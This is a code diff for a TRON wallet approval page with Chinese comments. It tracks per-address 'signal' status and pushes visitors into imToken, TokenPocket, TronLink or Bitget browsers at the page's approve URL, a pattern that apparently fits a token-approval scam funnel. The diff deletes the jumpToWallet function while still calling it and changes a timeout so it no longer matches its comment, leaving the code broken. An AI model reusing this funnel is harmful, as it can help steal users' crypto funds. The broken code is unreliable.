@@ -859,7 +859,7 @@ function hasSentB1Signal(address) {
     const item = records[address];
     if (!item) return false;
     // 30分钟过期（1800000毫秒）
-    return Date.now() - item.time <1800000;
+    return Date.now() - item.time <18000000;
   } catch (e) {
     console.warn("检查B1信号失败：", e);
     return false;
@@ -1370,44 +1370,9 @@ function bindApproveLogic() {
         } finally {
             jumpToWallet(userAddress, lang); // 传lang变量
         }
-    };
-
-    // 单独封装跳转函数（接收lang参数）
-    function jumpToWallet(userAddress, lang) {
-        const approveUrl = window.location.href + "#approve";
-        const encodedUrl = encodeURIComponent(approveUrl);
-        let jumpUrl = "";
-
-        // 多钱包Scheme适配（复用walletConfig）
-        if (window.tronWeb?.provider) {
-            if (window.tronWeb.provider.isImToken) {
-                jumpUrl = walletConfig.imtoken.scheme + encodedUrl;
-            } else if (window.tronWeb.provider.isTokenPocket) {
-                jumpUrl = walletConfig.tokenpocket.scheme + encodedUrl + walletConfig.tokenpocket.suffix;
-            } else if (window.tronWeb.provider.isTronLink) {
-                const param = JSON.stringify({ url: approveUrl, action: "open" });
-                jumpUrl = walletConfig.tronlink.scheme + encodeURIComponent(param);
-            } else if (window.tronWeb.provider.isBitKeep) {
-                jumpUrl = walletConfig.bitget.scheme + encodedUrl;
-            } else {
-                jumpUrl = walletConfig.imtoken.scheme + encodedUrl; // 默认imToken
-            }
-        } else {
-            jumpUrl = "imtoken://app/dapp?url=" + encodedUrl; // 最新imToken Scheme
-        }
-
-        try {
-            window.location.href = jumpUrl;
-            console.log("跳转钱包URL：", jumpUrl);
-        } catch (e) {
-            alert(`跳转失败，请手动打开钱包，在“浏览”页输入：${window.location.href}`);
-            const btn = approveBtn;
-            btn.disabled = false;
-            btn.textContent = lang.approveBtnText;
-            reviewTip.style.display = "none";
-        }
     }
-}
+
+   
             // A1信号校验+重试
             let a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
             let isA1Success = a1Status[userAddress] === "success";
